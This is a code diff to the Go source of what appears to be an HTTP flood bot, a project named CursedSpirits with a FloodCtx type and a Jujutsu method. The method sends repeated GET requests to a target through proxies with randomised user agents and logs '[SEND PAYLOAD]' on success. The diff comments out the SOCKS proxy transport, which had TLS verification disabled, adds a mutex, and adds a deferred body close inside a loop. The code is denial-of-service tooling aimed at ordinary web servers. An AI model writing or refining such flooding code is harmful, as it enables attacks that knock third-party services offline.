@@ -1,17 +1,16 @@
 package bot
 
 import (
-	"crypto/tls"
 	"fmt"
 	"math/rand"
 	"net/http"
 	"os"
+	"sync"
 	"time"
 
 	"Pix4Devs/CursedSpirits/globals"
 
 	"github.com/corpix/uarand"
-	"h12.io/socks"
 )
 
 type (
@@ -21,6 +20,7 @@ type (
 		StopAt      int
 		Client      *http.Client
 		Protocol    string
+		Mx          sync.Mutex
 	}
 )
 
@@ -30,12 +30,12 @@ func (ctx *FloodCtx) Jujutsu(proxy string) {
 		os.Kill.Signal()
 	}
 
-	ctx.Client.Transport = &http.Transport{
-		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
-		Dial:              socks.Dial(fmt.Sprintf("%s://%s", ctx.Protocol, proxy)),
-		ForceAttemptHTTP2: true,
-		MaxConnsPerHost:   0,
-	}
+	// ctx.Client.Transport = &http.Transport{
+	// 	TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
+	// 	Dial:              socks.Dial(fmt.Sprintf("%s://%s", ctx.Protocol, proxy)),
+	// 	ForceAttemptHTTP2: true,
+	// 	MaxConnsPerHost:   0,
+	// }
 
 	req, err := http.NewRequest("GET", ctx.Target, nil)
 	if err != nil {
@@ -54,6 +54,8 @@ func (ctx *FloodCtx) Jujutsu(proxy string) {
 		if err != nil {
 			continue
 		}
+
+		defer resp.Body.Close()
 
 		if resp.StatusCode >= 200 && resp.StatusCode <= 399 {
 			os.Stdout.WriteString(fmt.Sprintf("[SEND PAYLOAD] [---%s---]\r", proxy))
